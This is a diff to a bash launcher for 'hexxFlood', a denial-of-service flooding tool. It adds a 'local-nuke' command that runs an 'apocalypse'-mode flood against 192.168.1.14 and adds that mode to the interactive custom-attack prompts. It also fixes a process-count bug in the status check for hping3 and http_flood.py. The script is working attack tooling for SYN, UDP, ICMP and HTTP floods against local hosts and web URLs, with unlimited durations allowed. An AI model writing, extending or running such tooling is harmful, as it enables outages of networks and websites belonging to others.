@@ -2,7 +2,7 @@
 
 # ============================================================
 # hexxFlood - Quick Launcher Script
-# Version: 1.0
+# Version: 2.0
 # ============================================================
 
 # Colors
@@ -25,7 +25,7 @@ show_banner() {
     echo "║   ██║  ██║███████╗██╔╝ ██╗██╔╝ ██╗██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝   ║"
     echo "║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ║"
     echo "║                                                                                ║"
-    echo "║                              Quick Launcher v1.0                               ║"
+    echo "║                              Quick Launcher v2.0                               ║"
     echo "║                                Use Responsibly!                                ║"
     echo "╠════════════════════════════════════════════════════════════════════════════════╣"
     echo "║                             Author: CyWarX                                     ║"
@@ -44,6 +44,7 @@ show_help() {
     echo -e "${YELLOW}Commands:${NC}"
     echo "  local              - Attack local network (192.168.1.14) - Extreme"
     echo "  local-high         - Attack local network - High mode"
+    echo "  local-nuke         - Attack local network - Apocalypse (60s, max overdrive)"
     echo "  local-test         - Attack local network - Test (30 seconds)"
     echo "  web URL            - Attack web URL (http://example.com) - Extreme"
     echo "  web-high URL       - Attack web URL - High mode"
@@ -80,6 +81,11 @@ attack_local() {
 attack_local_high() {
     echo -e "${GREEN}🔥 Starting local attack (High) on 192.168.1.14${NC}"
     sudo hexxFlood -t 192.168.1.14 -m high
+}
+
+attack_local_nuke() {
+    echo -e "${GREEN}☢️  Starting local attack (Apocalypse, 60s) on 192.168.1.14${NC}"
+    sudo hexxFlood -t 192.168.1.14 -m apocalypse -D 60
 }
 
 attack_local_test() {
@@ -143,7 +149,7 @@ attack_custom() {
         echo "Web target detected"
         read -p "Threads (1-200, default: 50): " threads
         threads=${threads:-50}
-        read -p "Mode (easy/medium/high/extreme, default: high): " mode
+        read -p "Mode (easy/medium/high/extreme/apocalypse, default: high): " mode
         mode=${mode:-high}
         read -p "Duration in seconds (0=infinite, default: 0): " duration
         duration=${duration:-0}
@@ -153,7 +159,7 @@ attack_custom() {
     else
         read -p "Threads (1-200, default: 50): " threads
         threads=${threads:-50}
-        read -p "Mode (easy/medium/high/extreme, default: high): " mode
+        read -p "Mode (easy/medium/high/extreme/apocalypse, default: high): " mode
         mode=${mode:-high}
         read -p "Attack types (syn,udp,icmp,ack,rst,fin,all, default: all): " types
         types=${types:-all}
@@ -179,8 +185,10 @@ attack_status() {
     echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
     echo ""
     
-    HPING_COUNT=$(pgrep -c hping3 2>/dev/null || echo 0)
-    HTTP_COUNT=$(pgrep -cf http_flood.py 2>/dev/null || echo 0)
+    # NOTE: `pgrep -c` already prints 0 (and exits 1) on no match, so a trailing
+    # `|| echo 0` would append a SECOND 0 and break the numeric tests below.
+    HPING_COUNT=$(pgrep -c hping3 2>/dev/null); HPING_COUNT=${HPING_COUNT:-0}
+    HTTP_COUNT=$(pgrep -cf http_flood.py 2>/dev/null); HTTP_COUNT=${HTTP_COUNT:-0}
 
     if [ "$HPING_COUNT" -gt 0 ] || [ "$HTTP_COUNT" -gt 0 ]; then
         echo -e "${GREEN}✅ Attacks are running${NC}"
@@ -221,6 +229,9 @@ main() {
             ;;
         local-high)
             attack_local_high
+            ;;
+        local-nuke)
+            attack_local_nuke
             ;;
         local-test)
             attack_local_test
